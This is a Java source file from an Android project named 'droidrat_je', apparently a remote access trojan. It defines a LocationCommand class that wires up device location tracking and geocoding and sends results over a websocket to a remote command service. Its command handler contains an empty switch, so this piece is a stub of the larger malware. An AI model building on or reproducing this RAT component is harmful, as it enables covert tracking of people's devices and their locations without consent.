package com.je_chen.droidrat_je.command;

import android.content.Context;
import android.location.LocationManager;

import com.je_chen.droidrat_je.command.process_super.CommandFather;
import com.je_chen.droidrat_je.modules.location.LocationGeocoder;
import com.je_chen.droidrat_je.modules.location.LocationSystem;

import static com.je_chen.droidrat_je.service.command.ProcessCommandService.websocket;


public class LocationCommand extends CommandFather{

    private LocationSystem locationSystem;
    private LocationGeocoder locationGeocoder;

    public LocationCommand(Context context,LocationManager locationManager, String type, int sec, int meter){
        locationSystem = new LocationSystem(locationManager,type,sec,meter);
        locationGeocoder = new LocationGeocoder(context);
    }

    @Override
    public void send(String value) {
        websocket.send(value);
    }

    @Override
    public void processCommand(String command) {
        try {
            String[] rawCommandArray = command.split(" ");
            switch (rawCommandArray[1]) {

            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
